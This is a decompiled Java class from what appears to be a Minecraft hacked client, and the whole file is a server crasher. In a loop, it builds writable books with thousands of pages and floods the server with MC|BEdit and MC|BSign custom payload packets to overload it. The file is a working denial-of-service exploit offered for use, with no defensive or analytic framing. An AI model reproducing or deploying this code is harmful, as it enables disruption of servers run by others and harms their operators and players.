// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.util.text.ITextComponent;
import net.minecraft.util.text.TextComponentString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import me.amkgre.bettercraft.client.utils.TimeHelperUtils;

public class CryptoCrasher
{
    public static double delay;
    public static double packets;
    public static TimeHelperUtils timer;
    
    static {
        CryptoCrasher.timer = new TimeHelperUtils();
    }
    
    public static void start() {
        if (CryptoCrasher.timer.delay((float)CryptoCrasher.delay)) {
            for (int time = 0; time < CryptoCrasher.packets; ++time) {
                final ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                final NBTTagList bookPages = new NBTTagList();
                for (int i = 0; i < 4000; ++i) {
                    bookPages.appendTag(new NBTTagString("a"));
                }
                while (bookPages.tagCount() > 1) {
                    final String s2 = bookPages.getStringTagAt(bookPages.tagCount() - 1);
                    if (s2.length() != 0) {
                        break;
                    }
                    bookPages.removeTag(bookPages.tagCount() - 1);
                }
                if (bookObj.hasTagCompound()) {
                    final NBTTagCompound nbttagcompound = bookObj.getTagCompound();
                    nbttagcompound.setTag("pages", bookPages);
                }
                else {
                    bookObj.setTagInfo("pages", bookPages);
                }
                PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
                packetbuffer.writeItemStackToBuffer(bookObj);
                Minecraft.getMinecraft().getConnection().sendPacket(new CPacketCustomPayload("MC|BEdit", packetbuffer));
                bookObj.setTagInfo("author", new NBTTagString("a"));
                bookObj.setTagInfo("title", new NBTTagString("a"));
                for (int j = 0; j < bookPages.tagCount(); ++j) {
                    String s3 = bookPages.getStringTagAt(j);
                    final TextComponentString chatComponentText = new TextComponentString(s3);
                    s3 = ITextComponent.Serializer.componentToJson(chatComponentText);
                    bookPages.set(j, new NBTTagString(s3));
                }
                packetbuffer = new PacketBuffer(Unpooled.buffer());
                packetbuffer.writeItemStackToBuffer(bookObj);
                Minecraft.getMinecraft().getConnection().sendPacket(new CPacketCustomPayload("MC|BSign", packetbuffer));
            }
            CryptoCrasher.timer.resetss();
        }
    }
}
